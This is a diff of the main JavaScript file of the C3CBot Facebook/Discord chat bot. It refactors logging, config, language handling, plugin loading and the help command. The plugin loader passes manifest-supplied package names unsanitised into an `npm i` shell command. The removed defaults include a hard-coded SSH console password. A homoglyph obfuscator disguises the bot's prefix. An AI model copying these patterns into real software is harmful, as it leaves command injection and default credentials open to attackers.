@@ -2,7 +2,6 @@
 /* eslint-disable no-loop-func */
 /* eslint-disable require-atomic-updates */
 /* eslint-disable class-methods-use-this */
-/* eslint-disable no-redeclare */
 /* eslint-disable no-process-env */
 
 require("./ClassModifier.js");
@@ -12,26 +11,27 @@ var _sizeObject = function (object) {
 };
 global.nodemodule = {};
 var os = require("os");
+var FormData = require('form-data');
 const fs = require('fs');
 var path = require("path");
-const util = require('util');
 var syncrequest = require('sync-request');
 var wait = require('wait-for-stuff');
 var semver = require("semver");
 var childProcess = require("child_process");
+var streamBuffers = require("stream-buffers");
 //var url = require("url");
 //var net = require('net');
 var zlib = require("zlib");
 var tar = require("tar-stream");
 const readline = require('readline');
 var speakeasy = require("speakeasy"); //2FA
-var stripBom = require("strip-bom");
 const rl = readline.createInterface({
   input: process.stdin,
   output: process.stdout,
   terminal: true,
   prompt: ""
 });
+global.crl = rl;
 var fetch = require("node-fetch");
 var _checkPort = require("./checkPort.js");
 var CPULoad = require("./CPULoad.js");
@@ -56,6 +56,14 @@ try {
     );
   }
   console.log("[NOT LOGGED]", "Handling setPriority error:", ex);
+}
+
+//Adding FFMPEG to PATH
+let ffmpegExecPath = path.dirname(require("ffmpeg-static"));
+if (os.platform() == "win32") {
+  process.env.PATH += ";" + ffmpegExecPath;
+} else {
+  process.env.PATH += ":" + ffmpegExecPath;
 }
 
 global.reload = () => {
@@ -177,113 +185,8 @@ logFileList.forEach(dir => {
       });
     });
 });
-global.logLast = {
-  year: 1970,
-  month: 1,
-  days: 1,
-  loadTimes: 0
-};
-/**
- * Log to console and also write to logs file, print to every ssh console session
- *
- * @param   {any}  message     Anything
- *
- * @return  {undefined}        Function will not return anything
- */
-function log(...message) {
-  var date = new Date();
-  readline.cursorTo(process.stdout, 0);
-  var x = ["\x1b[K" + "\x1b[1;32m" + "\x1b[1;92m" + "\x1b[38;2;0;255;0m" + "[" +
-    (date.getUTCFullYear()
-      .pad(4) + "-" + (date.getUTCMonth() + 1)
-        .pad(2) + "-" + date.getUTCDate()
-          .pad(2) + "T" + date.getUTCHours()
-            .pad(2) + "-" + date.getUTCMinutes()
-              .pad(2) + "-" + date.getUTCSeconds()
-                .pad(2) + "." + date.getUTCMilliseconds()
-                  .pad(3) + "Z") + "]"];
-  console.log.apply(console, x.concat(message)
-    .concat(["\x1b[1;32m"]));
-  rl.prompt(true);
-  var tolog = "[" + (date.getUTCFullYear()
-    .pad(4) + "-" + (date.getUTCMonth() + 1)
-      .pad(2) + "-" + date.getUTCDate()
-        .pad(2) + "T" + date.getUTCHours()
-          .pad(2) + "-" + date.getUTCMinutes()
-            .pad(2) + "-" + date.getUTCSeconds()
-              .pad(2) + "." + date.getUTCMilliseconds()
-                .pad(3) + "Z") + "]";
-  for (var n in message) {
-    if (typeof message[n] == "object") {
-      tolog += " " + util.format("%O", message[n]);
-    } else {
-      tolog += " " + util.format("%s", message[n]);
-    }
-  }
-  var currentLogDate = date.getUTCFullYear()
-    .pad(4) + '-' + (date.getUTCMonth() + 1)
-      .pad(2) + '-' + date.getUTCDate()
-        .pad(2);
-  var lastLogDate = global.logLast.year.pad(4) + "-" + global.logLast.month.pad(2) + "-" + global.logLast.days.pad(2);
-  if (currentLogDate != lastLogDate) {
-    var times = 0;
-    for (; ;) {
-      if (!fs.existsSync(path.join(__dirname, "logs", `log-${currentLogDate}-${times}.tar.gz`)) && !fs.existsSync(path
-        .join(__dirname, "logs", `log-${currentLogDate}-${times}.log`))) {
-        break;
-      }
-      times++;
-    }
-    global.logLast = {
-      year: date.getUTCFullYear(),
-      month: date.getUTCMonth() + 1,
-      days: date.getUTCDate(),
-      loadTimes: times
-    };
-  }
-  fs.appendFile(
-    path.join(__dirname, "logs", `log-${currentLogDate}-${global.logLast.loadTimes}.log`), tolog + "\r\n",
-    function (err) {
-      if (err) {
-        console.log("[CRITICAL] [NOT LOGGED] ERROR WHILE WRITING LOGS: ", err);
-      }
-    }
-  );
-  var tssh = "\x1b[K" + "\x1b[1;32m" + "\x1b[1;92m" + "\x1b[38;2;0;255;0m[" + (date.getUTCFullYear()
-    .pad(4) + "-" + (date.getUTCMonth() + 1)
-      .pad(2) + "-" + date.getUTCDate()
-        .pad(2) + "T" + date.getUTCHours()
-          .pad(2) + "-" + date.getUTCMinutes()
-            .pad(2) + "-" + date.getUTCSeconds()
-              .pad(2) + "." + date.getUTCMilliseconds()
-                .pad(3) + "Z") + "]";
-  for (var n in message) {
-    if (typeof message[n] == "object") {
-      tssh += " " + util.formatWithOptions({
-        colors: true
-      }, "%O", message[n]);
-    } else {
-      tssh += " " + util.formatWithOptions({
-        colors: true
-      }, "%s", message[n]);
-    }
-  }
-  // eslint-disable-next-line no-extra-boolean-cast
-  if (!!global.sshcurrsession) {
-    if (typeof global.sshcurrsession == "object") {
-      for (var session in global.sshstream) {
-        try {
-          global.sshstream[session].stdout.write("\r");
-          global.sshstream[session].stdout.write(tssh.replace(/\r\n/g, "\uFFFF")
-            .replace(/\n/g, "\r\n")
-            .replace(/\uFFFF/g, "\r\n") + "\r\n" + "\x1b[1;32m");
-          global.sshcurrsession[session].prompt(true);
-          //global.sshstream[session].stdout.write(global.sshcurrsession[session].line);
-        } catch (ex) { }
-      }
-    }
-  }
-}
+
+var log = require("./logger.js");
 
 //Capturing STDERR
 var _stderrold = process.stderr.write;
@@ -306,114 +209,81 @@ setInterval(() => {
   global.stderrdata = "";
 }, 499);
 
+//Handling rejected promise that are unhandled
+process.on('unhandledRejection', (reason, promise) => {
+  log("[INTERNAL]", 'Warning: Rejected promise: ', promise, ', reason:', reason);
+});
+//Handling uncaught exception (without try/catch, usually in callback)
+//! DEFINELY NOT SAFE AT ALL, BUT STILL ADDING IT.
+process.on('uncaughtException', (err, origin) => {
+  log("[INTERNAL]", `Warning: ${origin}:`, err);
+});
+
 var autoUpdater = require("./autoUpdater.js");
 var cUpdate = autoUpdater.checkForUpdate();
+
 //Outputs version 
 var version = cUpdate.currVersion;
 log("Starting C3CBot version", version, "...");
-var defaultconfig = {
-  testmode: false,
-  baseprefix: "[Bot]",
-  botname: "C3CBot",
-  enablefb: false,
-  usefbappstate: true,
-  fbemail: "",
-  fbpassword: "",
-  fb2fasecret: "BASE32OFSECRETKEY",
-  fbuseragent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
-  fblistenwhitelist: false,
-  fblisten: [
-    "0" //Replace 0 with FB Thread ID
-  ],
-  facebookAutoRestartLoggedOut: true,
-  facebookProxy: null,
-  facebookProxyUseSOCKS: false,
-  portSOCK2HTTP: 0,
-  addressSOCK2HTTP: "127.0.0.1",
-  enablediscord: false,
-  discordtoken: "",
-  discordlistenwhitelist: false,
-  discordlisten: [
-    "0" //Replace 0 with Discord channel ID
-  ],
-  admins: [
-    "FB-0", //Replace 0 with FBID
-    "DC-0" //Replace 0 with Discord ID
-  ],
-  blacklistedUsers: [
-    "FB-0", //Replace 0 with FBID
-    "DC-0" //Replace 0 with Discord ID
-  ],
-  allowAdminUseRestartCommand: true,
-  allowAdminUseShutdownCommand: false,
-  allowUserUsePluginsCommand: true,
-  allowUserUseReloadCommand: false,
-  language: "en_US",
-  allowEveryoneTagEvenBlacklisted: true,
-  DEBUG_FCA_LOGLEVEL: "error",
-  enableSSHRemoteConsole: false,
-  sshRemoteConsoleIP: "0.0.0.0",
-  sshRemoteConsolePort: 2004,
-  sshUsername: "admin",
-  sshPassword: "c3cbot@ADMIN",
-  commandPrefix: "/",
-  autoUpdate: true,
-  autoUpdateTimer: 60,
-  configVersion: 1,
-  enableMetric: true,
-  metricHideBotAccountLink: true,
-  enableGlobalBan: true,
-  hideUnknownCommandMessage: false,
-  herokuApplication: ""
-};
 
-//Load config
-global.config = fs.existsSync(path.join(__dirname, "config.json")) ? (function () {
-  var readedConfig = JSON.parse(stripBom(fs.readFileSync(path.join(__dirname, "config.json"), {
-    encoding: "utf8"
-  })));
-  for (var configName in defaultconfig) {
-    if (!Object.prototype.hasOwnProperty.call(readedConfig, configName)) {
-      readedConfig[configName] = defaultconfig[configName];
-      log("[INTERNAL]", "Missing", configName, "in config file. Adding with default value (", defaultconfig[
-        configName], ")...");
-    }
-  }
-  for (var configName in readedConfig) {
-    if (!Object.prototype.hasOwnProperty.call(defaultconfig, configName)) {
-      delete readedConfig[configName];
-      log("[INTERNAL]", "Deleted ", configName, "in config file. (unused)");
-    }
-  }
-  fs.writeFileSync(path.join(__dirname, "config.json"), JSON.stringify(readedConfig, null, 4), {
-    mode: 0o666
-  });
-  return readedConfig;
-})() : (function () {
-  log("[INTERNAL]", "Config file not found. Creating a default one...");
-  try {
-    fs.writeFileSync(path.join(__dirname, "config.json"), JSON.stringify(defaultconfig, null, 4), {
-      mode: 0o666
-    });
-  } catch (ex) {
-    log("[INTERNAL]", "Cannot write default config, returned an error: ", ex);
-  }
-  return defaultconfig;
-})();
+global.config = require("./getConfig.js")();
+
 var testmode = global.config.testmode;
 var prefix = global.config.baseprefix;
-global.lang = require('js-yaml')
-  .load(fs.existsSync(path.join(__dirname, "lang", global.config.language + ".yml")) ? fs.readFileSync(path.join(__dirname, "lang", global.config.language + ".yml"), {
-    encoding: 'utf-8'
-  }) : (function () {
-    log(
-      "[INTERNAL]", path.join(__dirname, "lang", global.config.language + ".yml"),
-      ": not found | Defaulting to en_US.yml ..."
-    );
-    return fs.readFileSync(path.join(__dirname, "lang", "en_US.yml"), {
-      encoding: 'utf-8'
-    });
-  })());
+
+var availableLangFile = findFromDir(path.join(__dirname, "lang"), /.*\.yml$/, true, false);
+var langMap = {};
+var yamlParser = require('js-yaml');
+availableLangFile.forEach(v => {
+  var lang = path.parse(v);
+  log("[INTERNAL]", "Loading language:", lang.name);
+  var ymlData = fs.readFileSync(v, { encoding: "utf8" });
+  langMap[lang.name] = yamlParser.load(ymlData);
+});
+var getLang = function (langVal, id, oLang) {
+  var lang = global.config.language;
+  if (id && global.data.userLanguage[id]) {
+    lang = global.data.userLanguage[id];
+    if (!langMap[lang]) {
+      log("[INTERNAL]", "Warning: Invalid language: ", lang, `; using ${global.config.language} as fallback...`);
+      lang = global.config.language;
+    }
+  }
+  if (oLang) {
+    lang = oLang;
+    if (!langMap[lang]) {
+      log("[INTERNAL]", "Warning: Invalid language: ", lang, `; using ${global.config.language} as fallback...`);
+      lang = global.config.language;
+    }
+  }
+
+  if (langMap[lang]) {
+    return String(langMap[lang][langVal]);
+  } else {
+    log("[INTERNAL]", "Warning: Invalid language: ", lang, "; using en_US as fallback...");
+    return String((langMap["en_US"] || {})[langVal]);
+  }
+};
+
+/**
+ * Resolves data received from base and return formatted UserID.
+ *
+ * @param   {string}  type  Platform name
+ * @param   {string}  data  Data to be resolved by plugins
+ *
+ * @return  {string}        Formatted UserID
+ */
+var resolveID = function (type, data) {
+  switch (type) {
+    case "Facebook":
+      return "FB-" + data.msgdata.senderID || data.msgdata.author;
+    case "Discord":
+      return "DC-" + data.msgdata.author.id;
+    default:
+      return "";
+  }
+};
+
 if (global.config.facebookProxyUseSOCKS) {
   var ProxyServer = require("./SOCK2HTTP.js")(log);
   var fS2HResolve = function () { };
@@ -440,167 +310,13 @@ if (global.config.facebookProxyUseSOCKS) {
   var sock2httpPort = S2HResponse.port;
   var sock2httpAddress = S2HResponse.address;
 }
-/**
- * Obfuscate a string.
- *
- * @param   {string}  data  A string that you want to obfuscate.
- *
- * @return  {string}        An obfuscated string.
- */
-function obf(data) {
-  function Obfuscator(repl) {
-    this.nrepl = 0;
-    this.replacements = {};
-    this.revreplacements = {};
 
-    function removeDupes(str) {
-      var rv = "";
-      for (var i = 0; i < str.length; i++) {
-        var ch = str.charAt(i);
-        if (rv.indexOf(ch) == -1) {
-          rv += ch;
-        }
-      }
-      return rv;
-    }
-    for (var i = 0; i < repl.length; i++) {
-      var r = repl[i];
-      var original = r.charAt(0);
-      var s = removeDupes(r);
-      if (s.length > 1) {
-        for (var j = 0; j < s.length; j++) {
-          this.replacements[s.charAt(j)] = s.substring(0, j) + s.substring(j + 1);
-          if (s.charAt(j) !== original) {
-            this.revreplacements[s.charAt(j)] = original;
-          }
-          this.nrepl++;
-        }
-      }
-    }
-  }
-  Obfuscator.prototype.obfuscate = function (str) {
-    str = str + "";
-    var rv = "";
-    for (var i = 0; i < str.length; i++) {
-      var c = str.charAt(i);
-      var r = this.replacements[c];
-      if (r) {
-        var j = Math.floor(Math.random() * (r.length - 1));
-        rv += r.charAt(r.charAt(j) == c ? j + 1 : j);
-      } else {
-        rv += c;
-      }
-    }
-    return rv;
-  };
-  Obfuscator.prototype.deobfuscate = function (str) {
-    str = str + "";
-    var rv = "";
-    for (var i = 0; i < str.length; i++) {
-      var c = str.charAt(i);
-      var r = this.revreplacements[c];
-      if (r) {
-        rv += r;
-      } else {
-        rv += c;
-      }
-    }
-    return rv;
-  };
-  var strongObfuscator = new Obfuscator([
-    "AÀÁÂÃÄÅĀĂĄǍǞǠȀȂȦΆΑАѦӐӒḀẠẢẤẦẨẬẶἈἉᾈᾉᾸᾹᾺᾼ₳ÅȺẮẰẲẴἌἎἏᾌΆǺẪ",
-    "BƁΒВḂḄḆ",
-    "CÇĆĈĊČƇʗСҪḈ₢₵ℂⅭϹϾҀ",
-    "DÐĎĐƉƊḊḌḎḐḒⅮ",
-    "EÈÉÊËĒĔĖĘĚȄȆȨΕЀЁЕӖḘḚḜẸẺẼẾỀỆḔḖỂỄԐℇƐἙῈЄ",
-    "FϜḞ₣ҒƑϝғҒ₣",
-    "GĜĞĠĢƓǤǦǴḠ₲",
-    "HĤĦȞΗНҢҤӇӉḢḤḦḨḪῌꜦ",
-    "IΊÌÍÎÏĨĪĬĮİƖƗǏȈȊΙΪІЇӀӏḬḮỈỊἸἹῘῙῚǐ1",
-    "JĴʆЈʃ",
-    "KĶƘǨΚЌКԞḰḲḴ₭K",
-    "LĹĻĽĿŁԼḶḸḺḼℒⅬ˪",
-    "MΜМӍḾṀṂⅯ",
-    "NÑŃŅŇǸΝṄṆṈṊ₦Ɲ",
-    "O0θϑ⍬ÒÓÔÕÖØŌŎŐƆƟƠǑǪǬǾȌȎȪȬȮȰΘΟϴОѲӦӨӪՕỌỎỐỒỔỘỚỜỞỠỢΌΌṌṐṒὈʘṎỖ",
-    "PƤΡРҎṔṖῬ₱ℙ",
-    "QԚℚ",
-    "RŔŖŘȐȒṘṚṜṞ℞ɌⱤ",
-    "SŚŜŞŠȘЅՏṠṢṨṤṦ",
-    "TŢŤŦƮȚΤТҬṪṬṮṰ₮ȾΊΊꚌ",
-    "UÙÚÛÜŨŪŬŮŰŲƯǓǕǗǛȔȖԱՍṲṴṶṸỤỦỨỪỬỮỰǙ⊍⊎Մ⊌Ṻ",
-    "VѴѶṼṾ⋁ⅤƲ",
-    "WŴԜẀẂẄẆẈ₩ƜШ",
-    "XΧХҲẊẌⅩ",
-    "Y¥ÝŶŸƳȲΥΫϓУҮҰẎỲỴỶỸῨῩ",
-    "ZŹŻŽƵȤΖẐẒẔ",
-    "aàáâãäåāăąǎǟǡǻȁȃȧаӑӓḁẚạảấầẩẫậắằẳẵặɑάαἀἁἂἃἄἅἆἇὰάᾀᾁᾂᾃᾄᾅᾆᾇᾰᾱᾲᾳᾴᾶᾷ⍶⍺ɑ",
-    "bƀƃƅɒɓḃḅḇþϸƄьҍ",
-    "cçćĉċčƈςϛсҫḉⅽ¢ϲҁ",
-    "dďđɖɗḋḍḏḑḓⅾƌժ₫ð",
-    "eèéêëēĕėęěȅȇȩеѐёҽҿӗḕḗḙḛḝẹẻẽếềểễệεɛϵєϱѳөӫɵ",
-    "fſḟẛƒғϝ£ƒ",
-    "gĝğġģǥǧǵɠɡգզցḡɕʛɢ",
-    "hĥħȟɦɧћիհḣḥḧḩḫẖℏһʜӊ",
-    "iį¡ìíîïĩīĭįıǐȉȋɨɩΐίιϊіїɪḭḯỉịἰἱἲἳὶίῑΐῐῒῖὶ",
-    "jĵǰȷɟʝјյϳ",
-    "kķĸƙǩκкҝҟḱḳḵ",
-    "lŀĺļľłƚǀɫɬɭḷḹḻḽŀ⎩ḹ",
-    "mɱḿṁṃ₥ⅿ",
-    "nɴñńņňŉŋƞǹɲɳήηπпբդըղոռրṅṇṉṋἠἡἢἣἤἥἦἧὴήᾐᾑᾒᾓᾔᾕᾖᾗῂῃῄῆῇი",
-    "oòóôõöōŏőơǒǫǭȍȏȫȭȯȱʘοόоӧծձօṍṏṑṓọỏốồổỗộớờởỡợὀὁὂὃὄὅὸόσ๐",
-    "pþρрҏթṕṗῤῥ⍴",
-    "qʠԛգզϙ",
-    "rŕŗřȑȓɼɽгѓґӷṙṛṝṟгѓґӷ",
-    "sśŝşšșʂѕԑṡṣṥṧṩ",
-    "tţťŧƫțʈṫṭṯṱẗȶէե†ԷՒէȽҭ",
-    "uµùúûüũūŭůűųưǔǖǘǚǜȕȗɥμυцկմնսվևṳṵṷṹṻụủứừửữự",
-    "vʋνѵѷүұṽṿⅴ∨ΰϋύὐὑὒὓὔὕὖὗὺύῠῡῢΰῦῧʋ",
-    "wŵԝẁẃẅẇẉẘ",
-    "xϰхҳẋẍⅹ",
-    "yýÿŷƴȳγуўӯӱӳẏẙỳỵỷỹʏ",
-    "zźżžƶȥʐʑẑẓẕ",
-    "2ƻƨշ",
-    "3ЗҘӞƷӠЗҘӞՅɜɝзҙӟ",
-    "4ЧЧӴ",
-    "5Ƽ",
-    "6əǝә",
-    "8Ց",
-    // ☌øǿ - ???
-    "БƂ",
-    "ГΓЃҐӶ",
-    "ЖҖӜ",
-    "ИЍӢӤ",
-    "ЙҊ",
-    "ЛӅԒΛ",
-    "ПΠ",
-    "ЦҴ",
-    "ЬƄ",
-    "ЫӸ",
-    "ЪѢՒ",
-    "ЭӬ",
-    "вʙʙɞ",
-    "жҗӂӝ",
-    "зƨɜɝӟ",
-    "иѝӥ",
-    "йҋӣ",
-    "кĸκќқҝҟҡԟ",
-    "лӆԓ",
-    "мӎ",
-    "нʜңҥӈӊ",
-    "цџҵ",
-    "чҷҹӌӵ",
-    "шɯա",
-    "ъѣ",
-    "ыӹ",
-    "эǝɘəӭэӭ"
-  ]);
-  return strongObfuscator.obfuscate(data) || "";
-}
+let obf = require("./obfuscator.js");
 var _prefixObf = setInterval(() => {
   prefix = obf(global.config.baseprefix);
-  if (prefix == "") prefix = "\u200C";
+  if (prefix == "") prefix = "\u200B".repeat(random(1, 10));
 }, 1000);
+
 /**
  * Get a randomized number
  *
@@ -635,6 +351,7 @@ var _randomBytes = function (numbytes) {
 };
 //Cryptography
 var crypto = require('crypto');
+
 /**
  * Get a HMAC hash.
  *
@@ -653,12 +370,14 @@ function _HMAC(publick, privatek, algo, output) {
   var value = hmac.digest(output);
   return value;
 }
+
 ////Global data load
 //// global.dataSave = wait.for.promise(autosave('data' + (testmode ? "-test" : "") + '.json'));
 //// global.data = onChange(global.dataSave.data, function(){});
 //// global.watch('data', function (id, oldval, newval) {
 //// global.dataSave.data = global.data;
 //// });
+
 //* Load data
 if (testmode) {
   fs.existsSync(path.join(__dirname, "data-test.json")) ? global.data = JSON.parse(fs.readFileSync(path.join(
@@ -789,8 +508,8 @@ ensureExists(path.join(__dirname, "plugins/"));
 function checkPluginCompatibly(version) {
   version = version.toString();
   try {
-    //* Plugin complied with version 0.3.0 => 0.3.14 and 0.4.0 is allowed
-    var allowedVersion = "0.3.0 - 0.3.14 || 0.4.0";
+    //* Plugin complied with version 0.3.0 => 0.3.14 and 0.4.0 and 0.5.0 is allowed
+    var allowedVersion = "0.3.0 - 0.3.14 || 0.4.0 || 0.5.0";
     return semver.intersects(semver.clean(version), allowedVersion);
   } catch (ex) {
     return false;
@@ -809,8 +528,9 @@ function loadPlugin() {
   log("[INTERNAL]", "Searching for plugins in ./plugins/ ...");
   var pluginFileList = findFromDir(path.join(__dirname, "plugins/"), /.*\.(z3p|zip)$/, true, false);
   for (var n in pluginFileList) {
+    let zip = null;
     try {
-      var zip = new StreamZip({
+      zip = new StreamZip({
         file: pluginFileList[n],
         storeEntries: true
       });
@@ -865,11 +585,18 @@ function loadPlugin() {
               "[INTERNAL]", pluginFileList[n], "is requiring node modules named", nid,
               "but it isn't installed. Attempting to install it through npm package manager..."
             );
-            childProcess.execSync("npm i " + nid + (plinfo["node_depends"][
-              nid] == "*" || plinfo["node_depends"][nid] == "" ? "" : ("@" + plinfo["node_depends"][nid])), {
-              stdio: "ignore",
-              cwd: path.join(__dirname, "plugins")
-            });
+            childProcess.execSync(
+              "npm i " + nid + 
+              (
+                plinfo["node_depends"][nid] == "*" || 
+                plinfo["node_depends"][nid] == "" ? "" : ("@" + plinfo["node_depends"][nid])
+              ), 
+              {
+                stdio: "inherit",
+                cwd: path.join(__dirname, "plugins"),
+                env: process.env
+              }
+            );
             //Loading 3 more times before drop that plugins
             var moduleLoadTime = 0;
             var exception = "";
@@ -901,11 +628,15 @@ function loadPlugin() {
       pltemp1[plinfo["plugin_name"]] = plinfo;
       pltemp1[plinfo["plugin_name"]].filename = pluginFileList[n];
       pltemp2[plinfo["plugin_name"]] = plexec;
+      zip.close();
     } catch (ex) {
       log("[INTERNAL]", "Error while loading plugin at \"" + pluginFileList[n] + "\":", ex);
       error.push(pluginFileList[n]);
       delete pltemp1[plinfo["plugin_name"]];
       delete pltemp2[plinfo["plugin_name"]];
+      if (zip) {
+        zip.close();
+      }
     }
   }
   for (var plname in pltemp1) {
@@ -926,8 +657,10 @@ function loadPlugin() {
           var cmdo = pltemp1[plname]["command_map"][cmd];
           if (!cmdo["hdesc"] || !cmdo["fscope"] || isNaN(parseInt(cmdo["compatibly"]))) {
             log("[INTERNAL]", plname, "has a command that isn't have enough information to define (/" + cmd + ")");
-          } else if (!global.plugins[pltemp1[plname]["plugin_scope"]][cmdo
-            .fscope]) {
+          } else if (
+            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][cmdo.fscope]) != "Function" &&
+            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][cmdo.fscope]) != "AsyncFunction"
+          ) {
             log("[INTERNAL]", plname, "is missing a function for /" + cmd);
           } else {
             var oldstr;
@@ -962,7 +695,10 @@ function loadPlugin() {
         if (typeof pltemp1[plname]["chatHook"] == "string" &&
           typeof pltemp1[plname]["chatHookType"] == "string" &&
           !isNaN(parseInt(pltemp1[plname]["chatHookPlatform"])) &&
-          typeof global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]] == "function") {
+          (
+            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]]) == "Function" ||
+            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]]) == "AsyncFunction"
+          )) {
           global.chatHook.push({
             resolverFunc: global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]],
             listentype: pltemp1[plname]["chatHookType"],
@@ -1058,7 +794,7 @@ function loadPlugin() {
       } else {
         return {
           handler: "internal",
-          data: global.lang["INSUFFICIENT_PERM"]
+          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
         };
       }
     },
@@ -1098,24 +834,30 @@ function loadPlugin() {
     handler: "INTERNAL"
   };
   global.commandMapping["version"].args[global.config.language] = "";
-  global.commandMapping["version"].desc[global.config.language] = global.lang["VERSION_DESC"];
+  global.commandMapping["version"].desc[global.config.language] = getLang("VERSION_DESC");
   global.commandMapping["help"] = {
-    args: {},
-    desc: {},
+    args: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_ARGS"]])),
+    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_DESC"]])),
     scope: function (type, data) {
+      let ul = global.data.userLanguage[resolveID(type, data)] || global.config.language;
       if (isNaN(parseInt(data.args[1])) && data.args.length != 1) {
         var cmd = data.args[1];
         if (Object.prototype.hasOwnProperty.call(global.commandMapping, cmd)) {
           var mts = global.config.commandPrefix + cmd;
-          if (typeof global.commandMapping[cmd].args == "object" && typeof global.commandMapping[cmd].args[global
-            .config.language] != "undefined" && global.commandMapping[cmd].args[global.config.language].toString()
-              .replace(/ /g)
-              .length != 0) {
-            mts += " " + (global.commandMapping[cmd].args[global.config.language] ? global.commandMapping[cmd].args[
-              global.config.language] : "");
+          if (typeof global.commandMapping[cmd].args == "object") {
+            let ha = global.commandMapping[cmd].args;
+            if (typeof ha[ul] == "string") {
+              ha = ha[ul];
+            } else {
+              ha = ha[global.config.language];
+              typeof ha == "undefined" ? ha = "" : "";
+            }
+            if (ha.replace(/ /g).length != 0) {
+              mts += ` ${ha}`;
+            }
           }
-          mts += "\r\n" + global.commandMapping[cmd].desc[global.config.language];
-          mts += "\r\n" + global.lang["HELP_ARG_INFO"];
+          mts += "\r\n" + global.commandMapping[cmd].desc[ul] || global.commandMapping[cmd].desc[global.config.language];
+          mts += "\r\n" + getLang("HELP_ARG_INFO", resolveID(type, data));
           return {
             handler: "internal",
             data: mts
@@ -1123,19 +865,19 @@ function loadPlugin() {
         } else {
           return {
             handler: "internal",
-            data: global.config.commandPrefix + cmd + "\r\n" + global.lang["HELP_CMD_NOT_FOUND"]
+            data: global.config.commandPrefix + cmd + "\r\n" + getLang("HELP_CMD_NOT_FOUND", resolveID(type, data))
           };
         }
       } else {
         var page = 1;
         page = parseInt(data.args[1]) || 1;
         if (page < 1) page = 1;
-        var mts = "";
-        mts += global.lang["HELP_OUTPUT_PREFIX"];
+        let mts = "";
+        mts += getLang("HELP_OUTPUT_PREFIX", resolveID(type, data));
         var helpobj = global.commandMapping["help"];
         helpobj.command = "help";
-        helpobj.args[global.config.language] = global.lang["HELP_ARGS"];
-        helpobj.desc[global.config.language] = global.lang["HELP_DESC"];
+        helpobj.args[ul] = getLang("HELP_ARGS", resolveID(type, data));
+        helpobj.desc[ul] = getLang("HELP_DESC", resolveID(type, data));
         var hl = [helpobj];
         for (var no in global.commandMapping) {
           if (no !== "help") {
@@ -1160,24 +902,33 @@ function loadPlugin() {
           if (i < hl.length) {
             if (hl[i].compatibly == 0 || (hl[i].compatibly & compatiblyFlag)) {
               if (data.admin) {
-                mts += "\r\n" + (i + 1)
-                  .toString() + ". " + global.config.commandPrefix + hl[i].command;
-                if (typeof hl[i].args == "object" && typeof hl[i].args[global.config.language] != "undefined" && hl[i]
-                  .args[global.config.language].toString()
-                  .replace(/ /g)
-                  .length != 0) {
-                  mts += " " + (hl[i].args[global.config.language] ? hl[i].args[global.config.language] : "");
+                mts += `\n${i + 1}. ${global.config.commandPrefix}${hl[i].command}`;
+                if (typeof hl[i].args == "object") {
+                  let ha = hl[i].args;
+                  if (typeof ha[ul] == "string") {
+                    ha = ha[ul];
+                  } else {
+                    ha = ha[global.config.language];
+                    typeof ha == "undefined" ? ha = "" : "";
+                  }
+                  if (ha.replace(/ /g).length != 0) {
+                    mts += ` ${ha}`;
+                  }
+                } else if (typeof hl[i].args == "string") {
+                  mts += ` ${hl[i].args}`;
                 }
-                //mts += ": " + hl[i].desc[global.config.language];
-              } else {
-                if (!hl[i].adminCmd) {
-                  mts += "\r\n" + (i + 1)
-                    .toString() + ". " + global.config.commandPrefix + hl[i].command;
-                  if (typeof hl[i].args == "object" && typeof hl[i].args[global.config.language] != "undefined" && hl[
-                    i].args[global.config.language].toString()
-                    .replace(/ /g)
-                    .length != 0) {
-                    mts += " " + (hl[i].args[global.config.language] ? hl[i].args[global.config.language] : "");
+              } else if (!hl[i].adminCmd) {
+                mts += `\n${i + 1}. ${global.config.commandPrefix}${hl[i].command}`;
+                if (typeof hl[i].args == "object") {
+                  let ha = hl[i].args;
+                  if (typeof ha[ul] == "string") {
+                    ha = ha[ul];
+                  } else {
+                    ha = ha[global.config.language];
+                    typeof ha == "undefined" ? ha = "" : "";
+                  }
+                  if (ha.replace(/ /g).length != 0) {
+                    mts += ` ${ha}`;
                   }
                 }
               }
@@ -1185,11 +936,10 @@ function loadPlugin() {
           }
         }
         if (type == "Discord") {
-          mts += "\r\n```";
+          mts += "\n```";
         }
-        mts += '\r\n(' + global.lang["PAGE"] + ' ' + page + '/' + (hl.length / 15)
-          .ceil() + ')';
-        mts += "\r\n" + global.lang["HELP_MORE_INFO"].replace("{0}", global.config.commandPrefix);
+        mts += `\n(${getLang("PAGE", resolveID(type, data))} ${page}/${(hl.length / 15).ceil()})`;
+        mts += `\n${getLang("HELP_MORE_INFO", resolveID(type, data)).replace("{0}", global.config.commandPrefix)}`;
         return {
           handler: "internal",
           data: mts
@@ -1199,11 +949,9 @@ function loadPlugin() {
     compatibly: 0,
     handler: "INTERNAL"
   };
-  global.commandMapping["help"].args[global.config.language] = global.lang["HELP_ARGS"];
-  global.commandMapping["help"].desc[global.config.language] = global.lang["HELP_DESC"];
+
   global.commandMapping["restart"] = {
-    args: {},
-    desc: {},
+    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["RESTART_DESC"]])),
     scope: function (type, data) {
       if (data.admin && global.config.allowAdminUseRestartCommand) {
         setTimeout(function () {
@@ -1216,7 +964,7 @@ function loadPlugin() {
       } else {
         return {
           handler: "internal",
-          data: global.lang["INSUFFICIENT_PERM"]
+          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
         };
       }
     },
@@ -1224,11 +972,9 @@ function loadPlugin() {
     handler: "INTERNAL",
     adminCmd: true
   };
-  global.commandMapping["restart"].args[global.config.language] = "";
-  global.commandMapping["restart"].desc[global.config.language] = global.lang["RESTART_DESC"];
+
   global.commandMapping["shutdown"] = {
-    args: {},
-    desc: {},
+    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["SHUTDOWN_DESC"]])),
     scope: function (type, data) {
